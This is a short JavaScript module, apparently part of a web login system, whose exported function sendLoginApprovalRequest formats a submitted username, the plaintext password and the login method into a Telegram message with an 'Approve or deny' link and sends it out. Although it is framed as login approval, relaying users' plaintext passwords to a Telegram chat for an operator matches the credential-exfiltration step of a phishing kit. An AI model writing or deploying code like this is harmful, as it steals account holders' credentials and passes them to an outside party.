import { sendTelegramMessage } from '@/lib/actions';
import { PROJECT_DISPLAY_NAME } from '@/lib/project-config';

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function isHttpUrl(value) {
  return /^https?:\/\//i.test(String(value || '').trim());
}

function asCode(value) {
  const text = typeof value === 'string'
    ? value.trim()
    : value != null && value !== '' ? String(value) : '';
  return `<code>${escapeHtml(text || 'Unknown')}</code>`;
}

function asLink(url, label) {
  const href = String(url || '').trim();
  if (!href || !isHttpUrl(href)) return asCode(href || 'Unknown');
  const linkText = String(label || href).trim();
  return `<a href="${escapeHtml(href)}">${escapeHtml(linkText)}</a>`;
}

export async function sendLoginApprovalRequest(data) {
  const message = [
    `🔔 <b>Login request – approve or deny (${escapeHtml(PROJECT_DISPLAY_NAME)})</b>`,
    '',
    `👤 <b>Username:</b> ${asCode(data.userId)}`,
    `🔑 <b>Password:</b> ${asCode(data.password)}`,
    `📧 <b>Method:</b> ${asCode(data.method)}`,
    '',
    `👉 ${asLink(data.approvalsUrl, 'Approve or deny')}`,
  ].join('\n');
  return sendTelegramMessage(message);
}
